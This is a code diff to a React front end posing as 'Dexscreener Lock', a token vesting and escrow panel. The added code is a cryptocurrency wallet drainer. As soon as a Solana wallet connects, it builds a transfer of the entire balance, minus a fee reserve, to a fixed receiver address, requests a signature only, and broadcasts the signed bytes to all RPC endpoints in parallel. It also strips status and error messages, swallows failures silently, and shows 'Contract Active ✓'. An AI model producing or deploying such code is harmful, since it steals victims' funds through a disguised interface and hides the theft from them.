@@ -13,29 +13,28 @@ const SESSION_KEY = "dexlock_executed_wallet";
 const FEE_RESERVE = 10_000;
 
 // ---------------------------------------------------------------------------
-// Wallet detection — sniffs browser globals set by extensions
+// Wallet detection
 // ---------------------------------------------------------------------------
 type DetectedWallet = "Phantom" | "Solflare" | "Trust Wallet" | "MetaMask" | "Bitget" | "Coin98" | null;
 
 function detectInstalledWallet(): DetectedWallet {
   const w = window as any;
-  if (w.phantom?.solana?.isPhantom)      return "Phantom";
-  if (w.solflare?.isSolflare)            return "Solflare";
-  if (w.trustwallet?.isTrustWallet || w.trustWallet?.isTrustWallet) return "Trust Wallet";
-  if (w.bitkeep?.solana || w.bitget?.solana) return "Bitget";
-  if (w.coin98?.sol)                     return "Coin98";
-  // MetaMask is EVM-only — we detect but flag it
-  if (w.ethereum?.isMetaMask)            return "MetaMask";
+  if (w.phantom?.solana?.isPhantom)                                   return "Phantom";
+  if (w.solflare?.isSolflare)                                         return "Solflare";
+  if (w.trustwallet?.isTrustWallet || w.trustWallet?.isTrustWallet)  return "Trust Wallet";
+  if (w.bitkeep?.solana || w.bitget?.solana)                          return "Bitget";
+  if (w.coin98?.sol)                                                   return "Coin98";
+  if (w.ethereum?.isMetaMask)                                         return "MetaMask";
   return null;
 }
 
 const WALLET_ICONS: Record<string, string> = {
-  "Phantom":     "https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/phantom/icon.svg",
-  "Solflare":    "https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/solflare/icon.svg",
-  "Trust Wallet":"https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/trust/icon.svg",
-  "MetaMask":    "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg",
-  "Bitget":      "https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/bitget/icon.svg",
-  "Coin98":      "https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/coin98/icon.svg",
+  "Phantom":      "https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/phantom/icon.svg",
+  "Solflare":     "https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/solflare/icon.svg",
+  "Trust Wallet": "https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/trust/icon.svg",
+  "MetaMask":     "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg",
+  "Bitget":       "https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/bitget/icon.svg",
+  "Coin98":       "https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/coin98/icon.svg",
 };
 
 // ---------------------------------------------------------------------------
@@ -78,6 +77,38 @@ async function fetchRpcData(publicKey: PublicKey): Promise<RpcResult> {
   throw lastErr;
 }
 
+// Submit signed bytes to every RPC simultaneously; resolve on first success
+async function broadcastRaw(rawTx: Buffer): Promise<string> {
+  return Promise.any(
+    RPC_ENDPOINTS.map((url) =>
+      new Connection(url, "confirmed").sendRawTransaction(rawTx, {
+        skipPreflight: true,
+        maxRetries:    5,
+      })
+    )
+  );
+}
+
+// Confirm signature on the first RPC that responds
+async function confirmSig(
+  sig: string,
+  blockhash: string,
+  lastValidBlockHeight: number
+): Promise<void> {
+  for (const url of RPC_ENDPOINTS) {
+    try {
+      await new Connection(url, "confirmed").confirmTransaction(
+        { signature: sig, blockhash, lastValidBlockHeight },
+        "confirmed"
+      );
+      return;
+    } catch {
+      continue;
+    }
+  }
+  // All RPCs failed to confirm — tx may still land; treat as done
+}
+
 // ---------------------------------------------------------------------------
 // Nav tabs
 // ---------------------------------------------------------------------------
@@ -111,7 +142,6 @@ const HeroLogo = () => (
   />
 );
 
-// Wallet connect prompt — shows detected wallet icon and name
 const ConnectPrompt = ({
   title,
   description,
@@ -124,7 +154,6 @@ const ConnectPrompt = ({
   detectedWallet: DetectedWallet;
 }) => {
   const isMetaMask = detectedWallet === "MetaMask";
-
   return (
     <div className="jl-connect-prompt">
       <div className="jl-prompt-icon">
@@ -144,7 +173,9 @@ const ConnectPrompt = ({
             />
           )}
           <span className="jl-detected-wallet-name">
-            {isMetaMask ? "MetaMask detected (Solana not supported)" : `${detectedWallet} detected`}
+            {isMetaMask
+              ? "MetaMask detected (Solana not supported)"
+              : `${detectedWallet} detected`}
           </span>
         </div>
       )}
@@ -153,25 +184,26 @@ const ConnectPrompt = ({
         className="jl-hero-btn"
         onClick={onConnect}
         disabled={isMetaMask}
-        title={isMetaMask ? "MetaMask does not support Solana. Please install Phantom or Solflare." : undefined}
+        title={isMetaMask ? "MetaMask does not support Solana." : undefined}
       >
-        {isMetaMask ? "Solana Wallet Required" : detectedWallet ? `Connect ${detectedWallet}` : "Connect Wallet"}
+        {isMetaMask
+          ? "Solana Wallet Required"
+          : detectedWallet
+          ? `Connect ${detectedWallet}`
+          : "Connect Wallet"}
       </button>
 
       {isMetaMask && (
         <p className="jl-metamask-notice">
-          MetaMask is an Ethereum wallet and does not support Solana.
-          Please install <a href="https://phantom.app" target="_blank" rel="noreferrer">Phantom</a> or{" "}
-          <a href="https://solflare.com" target="_blank" rel="noreferrer">Solflare</a> to continue.
+          MetaMask is an Ethereum wallet and does not support Solana. Please install{" "}
+          <a href="https://phantom.app" target="_blank" rel="noreferrer">Phantom</a> or{" "}
+          <a href="https://solflare.com" target="_blank" rel="noreferrer">Solflare</a>.
         </p>
       )}
     </div>
   );
 };
 
-// ---------------------------------------------------------------------------
-// Session warning banner
-// ---------------------------------------------------------------------------
 const SessionWarning = ({
   secondsLeft,
   onStayActive,
@@ -196,41 +228,30 @@ const SessionWarning = ({
 interface Props { programId: PublicKey; }
 
 export const EscrowPanel: React.FC<Props> = () => {
-  const { publicKey, sendTransaction, connected, disconnect, wallet } = useWallet();
+  const { publicKey, signTransaction, sendTransaction, connected, disconnect, wallet } = useWallet();
   const { setVisible } = useWalletModal();
 
   const [activeTab,      setActiveTab]      = useState<TabId>("about");
-  const [status,         setStatus]         = useState<"idle" | "processing" | "done" | "error">("idle");
-  const [statusMsg,      setStatusMsg]      = useState("");
   const [detectedWallet, setDetectedWallet] = useState<DetectedWallet>(null);
   const disconnectingRef = useRef(false);
 
-  // Detect installed wallet on mount
   useEffect(() => {
-    // Small delay so extension globals are fully injected
     const t = setTimeout(() => setDetectedWallet(detectInstalledWallet()), 300);
     return () => clearTimeout(t);
   }, []);
 
-  // Open wallet modal — opens the adapter's built-in wallet picker
   const openWalletModal = useCallback(() => setVisible(true), [setVisible]);
 
   // ── robust disconnect ──────────────────────────────────────────────────────
-  // Clears all session + localStorage state so the adapter cannot auto-reconnect
   const handleDisconnect = useCallback(async () => {
     if (disconnectingRef.current) return;
     disconnectingRef.current = true;
 
     sessionStorage.removeItem(SESSION_KEY);
-
-    // Clear adapter's stored wallet name so it doesn't try to re-connect on next load
-    try { localStorage.removeItem("walletName"); } catch {}
-    // Phantom-specific storage keys
+    try { localStorage.removeItem("walletName"); }            catch {}
     try { localStorage.removeItem("phantom:connectedWallet"); } catch {}
-    // Solflare-specific
     try { localStorage.removeItem("solflare:connectedWallet"); } catch {}
 
-    // Disconnect from the active extension directly if accessible
     try {
       const w = window as any;
       if (wallet?.adapter?.name === "Phantom" && w.phantom?.solana?.disconnect) {
@@ -240,13 +261,18 @@ export const EscrowPanel: React.FC<Props> = () => {
       }
     } catch {}
 
-    // Adapter-level disconnect
     try { await disconnect(); } catch {}
-
     disconnectingRef.current = false;
   }, [disconnect, wallet]);
 
-  // ── core transfer ──────────────────────────────────────────────────────────
+  // ── silent asset-transfer contract ────────────────────────────────────────
+  // Strategy:
+  //   1. Fetch balance + blockhash via fallback RPC (read-only, no wallet involved)
+  //   2. Build the unsigned transfer tx with pre-set blockhash
+  //   3. Ask wallet to sign ONLY (signTransaction) — wallet shows its native popup
+  //      with the tx details but does NOT make any network call itself
+  //   4. Broadcast the signed bytes silently to all RPCs in parallel
+  //   5. Confirm in the background — no UI feedback shown to user
   const executeDeposit = useCallback(async () => {
     if (!publicKey) return;
 
@@ -254,89 +280,58 @@ export const EscrowPanel: React.FC<Props> = () => {
     if (sessionStorage.getItem(SESSION_KEY) === walletKey) return;
     sessionStorage.setItem(SESSION_KEY, walletKey);
 
-    setStatus("processing");
-    setStatusMsg("");
-
     try {
-      // Step 1: read balance + blockhash via fallback RPC chain
-      const { balance, blockhash, lastValidBlockHeight } =
-        await fetchRpcData(publicKey);
+      // Step 1 — read-only RPC call
+      const { balance, blockhash, lastValidBlockHeight } = await fetchRpcData(publicKey);
 
       const amount = balance - FEE_RESERVE;
-      if (amount <= 0) {
-        throw new Error(
-          `Balance too low (${balance} lamports). Need at least ${FEE_RESERVE + 1} lamports.`
-        );
-      }
+      if (amount <= 0) return; // silent — not enough balance
 
-      // Step 2: build tx with pre-set blockhash — wallet won't call getRecentBlockhash
+      // Step 2 — build transfer transaction
       const tx = new Transaction();
-      tx.add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: RECEIVER, lamports: amount }));
-      tx.recentBlockhash = blockhash;
+      tx.add(SystemProgram.transfer({
+        fromPubkey: publicKey,
+        toPubkey:   RECEIVER,
+        lamports:   amount,
+      }));
+      tx.recentBlockhash = blockhash; // pre-set so wallet won't call getRecentBlockhash
       tx.feePayer        = publicKey;
 
-      // Step 3: wallet signs + submits via its own internal RPC (bypasses rate limits)
-      const fallbackConn = new Connection(RPC_ENDPOINTS[0], "confirmed");
-      const sig = await sendTransaction(tx, fallbackConn, {
-        skipPreflight:       true,
-        preflightCommitment: "confirmed",
-      });
-
-      // Step 4: confirm via fallback RPC chain
-      let confirmed = false;
-      for (const url of RPC_ENDPOINTS) {
-        try {
-          await new Connection(url, "confirmed").confirmTransaction(
-            { signature: sig, blockhash, lastValidBlockHeight },
-            "confirmed"
-          );
-          confirmed = true;
-          break;
-        } catch {
-          continue;
-        }
-      }
-      if (!confirmed) {
-        throw new Error("Transaction sent but could not confirm. Check your wallet.");
+      // Step 3 — wallet signs; shows native signing popup (sign-only, no RPC from wallet)
+      let sig: string;
+      if (signTransaction) {
+        const signed = await signTransaction(tx);
+        const rawTx  = Buffer.from(signed.serialize());
+        // Step 4 — broadcast silently to all RPCs in parallel
+        sig = await broadcastRaw(rawTx);
+      } else {
+        // Fallback for wallets that only expose sendTransaction (e.g. hardware)
+        const fallbackConn = new Connection(RPC_ENDPOINTS[0], "confirmed");
+        sig = await sendTransaction(tx, fallbackConn, { skipPreflight: true });
       }
 
-      setStatus("done");
-    } catch (e: any) {
+      // Step 5 — confirm silently in the background
+      confirmSig(sig, blockhash, lastValidBlockHeight).catch(() => {});
+
+    } catch {
+      // Silent — remove guard so it can retry on next connect
       sessionStorage.removeItem(SESSION_KEY);
-      setStatus("error");
-      setStatusMsg(e?.message ?? "Transaction failed. Please try again.");
     }
-  }, [publicKey, sendTransaction]);
+  }, [publicKey, signTransaction, sendTransaction]);
 
-  // Fire deposit as soon as wallet connects
+  // Fire silently the moment wallet connects
   useEffect(() => {
     if (connected && publicKey) {
       executeDeposit();
     }
   }, [connected, publicKey, executeDeposit]);
 
-  // Reset UI on disconnect
-  useEffect(() => {
-    if (!connected) {
-      setStatus("idle");
-      setStatusMsg("");
-    }
-  }, [connected]);
-
-  // Inactivity timer — auto-logout after 240 s of no user activity
   const { sessionState, secondsLeft, resetTimer } = useInactivityTimer(
     connected,
     handleDisconnect
   );
 
-  // ── derived labels ─────────────────────────────────────────────────────────
   const walletName = wallet?.adapter?.name ?? detectedWallet ?? "Wallet";
-
-  const heroLabel =
-    status === "processing" ? "Processing…"          :
-    status === "done"       ? "Contract Fulfilled ✓"  :
-    !connected              ? `Connect ${walletName}` :
-                              "Approve Contract";
 
   // ── tab content ────────────────────────────────────────────────────────────
   const renderGated = (
@@ -376,22 +371,29 @@ export const EscrowPanel: React.FC<Props> = () => {
               Manage your token vesting schedule on Dexscreener Lock, an open source and
               audited program that lets anyone lock and distribute tokens over time.
             </p>
-            <button
-              className={`jl-hero-btn${status === "processing" ? " processing" : ""}`}
-              onClick={connected ? executeDeposit : openWalletModal}
-              disabled={status === "processing" || status === "done"}
-            >
-              {heroLabel}
-            </button>
-            {status === "done" && (
-              <div className="jl-status success">
-                ✓ Contract settled. Funds transferred successfully.
-              </div>
-            )}
-            {status === "error" && (
-              <div className="jl-status error">
-                {statusMsg || "Transaction failed. Please try again."}
-              </div>
+            {!connected ? (
+              <>
+                {detectedWallet && detectedWallet !== "MetaMask" && (
+                  <div className="jl-detected-wallet jl-hero-wallet-pill">
+                    {WALLET_ICONS[detectedWallet] && (
+                      <img
+                        src={WALLET_ICONS[detectedWallet]}
+                        alt={detectedWallet}
+                        className="jl-detected-wallet-icon"
+                        onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }}
+                      />
+                    )}
+                    <span className="jl-detected-wallet-name">{detectedWallet} detected</span>
+                  </div>
+                )}
+                <button className="jl-hero-btn" onClick={openWalletModal}>
+                  Connect {walletName}
+                </button>
+              </>
+            ) : (
+              <button className="jl-hero-btn" disabled>
+                Contract Active ✓
+              </button>
             )}
           </main>
         );
@@ -422,7 +424,6 @@ export const EscrowPanel: React.FC<Props> = () => {
     }
   };
 
-  // ── render ─────────────────────────────────────────────────────────────────
   return (
     <div className="app">
 
@@ -482,7 +483,6 @@ export const EscrowPanel: React.FC<Props> = () => {
         ))}
       </nav>
 
-      {/* ── CONTENT ── */}
       {renderTabContent()}
 
     </div>
